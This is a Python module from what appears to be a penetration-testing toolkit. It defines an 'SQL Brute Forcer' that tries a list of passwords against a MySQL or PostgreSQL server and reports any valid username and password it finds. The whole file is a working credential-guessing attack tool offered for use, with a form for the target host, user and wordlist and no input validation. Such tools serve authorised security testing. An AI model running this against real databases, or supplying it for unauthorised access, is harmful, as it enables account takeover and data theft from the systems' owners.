from typing import Dict, Any, List
from aleo_pantest.core.base_tool import BaseTool, ToolMetadata, ToolCategory
import time
import socket

try:
    import mysql.connector
    HAS_MYSQL = True
except ImportError:
    HAS_MYSQL = False

try:
    import psycopg2
    HAS_POSTGRES = True
except ImportError:
    HAS_POSTGRES = False

class SQLBruteForcer(BaseTool):
    def __init__(self):
        metadata = ToolMetadata(
            name="SQL Brute Forcer",
            description="Brute force SQL database credentials (MySQL, PostgreSQL)",
            version="3.3.0",
            author="deltaastra24@gmail.com",
            category=ToolCategory.DATABASE,
            usage="Aleocrophic run sql-brute --host <target> --port <port> --user <user> --wordlist <path>",
            requirements=["mysql-connector-python", "psycopg2"],
            tags=["sql", "brute-force", "database", "credentials"],
            risk_level="HIGH",
            form_schema=[
                {
                    "name": "host",
                    "label": "Database Host",
                    "type": "text",
                    "placeholder": "127.0.0.1",
                    "required": True
                },
                {
                    "name": "type",
                    "label": "DB Type",
                    "type": "select",
                    "options": ["mysql", "postgresql"],
                    "default": "mysql"
                },
                {
                    "name": "port",
                    "label": "Port",
                    "type": "number",
                    "default": 3306
                },
                {
                    "name": "user",
                    "label": "Username",
                    "type": "text",
                    "default": "root"
                },
                {
                    "name": "passwords",
                    "label": "Passwords (Comma separated or one per line)",
                    "type": "textarea",
                    "placeholder": "admin123\npassword\nroot123",
                    "required": True
                }
            ]
        )
        super().__init__(metadata)

    def run(self, host: str = "127.0.0.1", type: str = "mysql", port: int = 3306, user: str = "root", passwords: str = "", **kwargs) -> Dict[str, Any]:
        if not host or not passwords:
            self.add_error("Host and Passwords are required")
            return self.get_results()

        password_list = [p.strip() for p in passwords.replace(',', '\n').split('\n') if p.strip()]
        
        self.add_result(f"[*] Starting brute force on {type.upper()} at {host}:{port}")
        self.add_result(f"[*] Target User: {user}")
        self.add_result(f"[*] Loaded {len(password_list)} passwords to test")

        found = False
        for password in password_list:
            self.add_result(f"[.] Testing: {password}")
            
            success = False
            if type == "mysql":
                if not HAS_MYSQL:
                    self.add_error("mysql-connector-python is not installed")
                    break
                try:
                    conn = mysql.connector.connect(
                        host=host,
                        port=port,
                        user=user,
                        password=password,
                        connect_timeout=3
                    )
                    conn.close()
                    success = True
                except Exception:
                    pass
            elif type == "postgresql":
                if not HAS_POSTGRES:
                    self.add_error("psycopg2 is not installed")
                    break
                try:
                    import psycopg2
                    conn = psycopg2.connect(
                        host=host,
                        port=port,
                        user=user,
                        password=password,
                        connect_timeout=3
                    )
                    conn.close()
                    success = True
                except Exception:
                    pass

            if success:
                self.add_result(f"[+] SUCCESS! Found valid credentials: {user}:{password}")
                found = True
                break
        
        if not found:
            self.add_result("[-] No valid credentials found.")

        return self.get_results()

    def validate_input(self, **kwargs) -> bool:
        return True
